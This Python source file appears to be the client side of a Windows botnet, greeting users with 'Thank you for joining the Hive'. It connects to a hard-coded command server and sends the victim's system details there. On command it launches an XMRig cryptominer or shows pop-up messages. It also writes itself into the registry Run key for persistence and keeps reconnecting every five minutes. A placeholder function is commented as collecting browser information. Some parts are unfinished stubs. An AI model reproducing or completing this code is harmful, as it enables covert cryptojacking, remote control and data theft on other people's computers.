import json
import os
import socket
import subprocess
import threading
import winreg as reg
import time
from sys import platform

# Define global variables
is_running = True
server_host = '192.168.0.104'
server_port = 12345

# Function to handle server commands
def handle_server_commands(client_socket):
    while True:
        try:
            command = client_socket.recv(1024).decode('utf-8').strip()
            if not command:
                continue
            if command.startswith("message:"):
                # Display a message to the user
                show_message(command)
            elif command == "get_system_info":
                # Request and send system information to the server
                system_info = get_system_info()
                client_socket.send(system_info.encode('utf-8'))
            elif command.startswith("start_mining:"):
                # Start mining using XMRig
                mining_path = command.split(":")[1].strip()
                start_mining(mining_path)
            elif command == "stop_mining":
                # Stop the mining process
                stop_mining()
        except ConnectionResetError:
            print("Connection lost. Server may have shut down.")
            client_socket.close()
            go_into_standby_mode()  # Attempt to reconnect
            break
        except Exception as e:
            print(f"Unexpected error: {e}")
            break

#Func to make a user send info from browsers
def get_user_info():
    pass

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    # Name of the executable
    p_name = "MyScript.exe"
    # Path to the executable
    new_file_path = os.path.join(file_path, p_name)
    # Registry key to add
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open, "any_name", 0, reg.REG_SZ, new_file_path)
    reg.CloseKey(open)

# Function to display a message to the user
def show_message(message):
    clean_message = message.replace('message:', '')
    vbscript_content = f'MsgBox "{clean_message}", 262192, "Server Message"'
    vbs_file = "message_popup.vbs"
    with open(vbs_file, "w") as file:
        file.write(vbscript_content)
    subprocess.run(["wscript", vbs_file])

# Function to obtain system information

import platform

# Function to obtain system information
def get_system_info():
    try:
        info = {
            "platform": platform.system(),
            "platform-release": platform.release(),
            "platform-version": platform.version(),
            "architecture": platform.machine(),
            "hostname": socket.gethostname(),
            "ip-address": get_local_ip(),
            "cpu": platform.processor(),
            # Add more system information here if needed
        }
        return json.dumps(info)
    except Exception as e:
        print(f"Error obtaining system info: {e}")
        return json.dumps({"error": str(e)})

# Function to get the local IP address
def get_local_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception as e:
        print(f"Error obtaining local IP address: {e}")
        return "Not available"

# Function to start XMRig mining
def start_mining(mining_path):
    try:
        subprocess.Popen([mining_path])
        print("Started XMRig mining process.")
    except Exception as e:
        print(f"Failed to start XMRig: {e}")

# Function to stop the mining process
def stop_mining():
    # Implement the logic to stop the mining process here
    print("Stopping XMRig mining process.")

# Function to go into standby mode and attempt reconnection
def go_into_standby_mode():
    print("Client is now in standby mode, waiting for server...")
    while True:
        try:
            # Attempt to reconnect every 5 minutes
            time.sleep(300)
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((server_host, server_port))
                print("Reconnected to the server.")
                # Handle reconnection here, such as entering a message handling loop
                break
        except socket.error as e:
            print(f"Connection attempt failed: {e}")
            print("Retrying in 5 minutes...")
        except KeyboardInterrupt:
            print("Client exiting...")
            break

# Main client program
def client_program():
    client_socket = socket.socket()

    try:
        client_socket.connect((server_host, server_port))
        handle_server_commands(client_socket)
        add_to_startup()
    except Exception as e:
        print(f"Failed to connect to server: {e}")
        go_into_standby_mode()

if __name__ == '__main__':
    print("Thank you for joining the Hive, all Hail the Queen!")
    client_program()
